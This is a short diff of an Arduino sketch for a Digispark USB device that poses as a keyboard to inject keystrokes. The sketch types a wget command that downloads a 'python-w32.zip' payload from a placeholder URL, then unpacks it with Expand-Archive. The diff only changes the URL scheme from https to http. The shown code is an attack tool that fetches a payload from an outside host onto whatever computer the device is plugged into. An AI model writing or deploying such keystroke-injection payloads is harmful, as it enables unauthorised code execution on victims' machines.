@@ -10,7 +10,7 @@ void setup() {
 	DigiKeyboard.delay(500);
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(1000);
-	DigiKeyboard.println("wget https://embeddable-package-&-payload-URL/python-w32.zip -O python-w32.zip");
+	DigiKeyboard.println("wget http://embeddable-package-&-payload-URL/python-w32.zip -O python-w32.zip");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(500);
 	DigiKeyboard.println("Expand-Archive -Force python-w32.zip -DestinationPath App");
